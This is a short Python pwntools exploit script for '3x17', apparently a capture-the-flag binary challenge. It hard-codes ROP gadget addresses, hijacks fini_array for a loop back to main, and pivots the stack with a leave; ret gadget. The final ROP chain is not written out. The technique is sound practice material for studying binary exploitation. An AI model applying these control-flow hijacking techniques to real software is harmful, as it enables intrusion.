#!/usr/bin/env	python3
import pwn

# start -> 0x00401a50 
# main -> 0x00401b6d 


# syscall gadget
syscall_gadget = 0x0000000000471db5

# pop rdi gadget
pop_rdi_ret = 0x0000000000401696

# pop rsi gadget
pop_rsi_ret = 0x0000000000406c30

# pop rdx gadget
pop_rdx_ret = 0x0000000000446e35

# fini function which calls fini_array
fini_fcn = 0x0000000000402960

# fini_array which holds deconstructor functions
fini_array = 4931824

# address for main function in binary
main_fcn = 0x0000000000401B6D

# leave ret gadget
leave_ret = 0x0000000000401c4b

def int64_to_bytes(shellcode):
	bytes_data = b""

	# convert to bytes from shellcode
	for data in shellcode:
		bytes_data += pwn.p64(data)
	return bytes_data

def write(p1, addr, data):
	p1.recvuntil(b"addr:")
	p1.sendline(str(addr).encode())
	p1.recvuntil(b"data:")
	p1.send(data)

@pwn.context.quiet
def main():
	tproc = pwn.gdb.debug("./3x17", """
	break *0x0000000000402960
	""")

	write(tproc, fini_array, pwn.p64(fini_fcn) + pwn.p64(main_fcn))
	write(tproc, fini_array, pwn.p64(leave_ret) + pwn.p64(main_fcn))

	tproc.interactive()
	tproc.close()

if __name__ == "__main__":
	main()
